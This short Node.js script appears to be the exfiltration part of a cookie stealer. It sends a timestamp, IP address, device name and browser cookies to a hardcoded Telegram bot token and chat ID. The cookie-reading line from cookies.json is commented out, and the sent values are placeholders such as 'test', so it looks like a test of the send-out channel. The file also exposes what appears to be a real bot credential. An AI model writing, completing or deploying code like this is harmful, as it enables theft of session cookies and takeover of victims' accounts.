const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const token = '6739943992:AAG9k_rzDkAXRsiVqmzvJ-i_nDPQjorg8UQ';
const chatid = '6656772173';
function getVietnamCurrentTime() {
    const now = new Date();
    const options = {
        timeZone: 'Asia/Ho_Chi_Minh',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
    };
    return now.toLocaleString('vi-VN', options);
}
// const cookies = fs.readFileSync('cookies.json', 'utf8');
const cookies = "test"
const vietnamTime = getVietnamCurrentTime();
async function sendTelegramMessage() {
    const bot = new TelegramBot(token, { polling: true });
    const text = '***' + vietnamTime + '***\n ***IP: ***`test 123.123.123`\n ***Thiết bị: *** `Iphone 999`\n ***Cookies: *** `' + cookies + '`';
    await bot.sendMessage(chatid, text, { parse_mode: 'Markdown' });
}

sendTelegramMessage();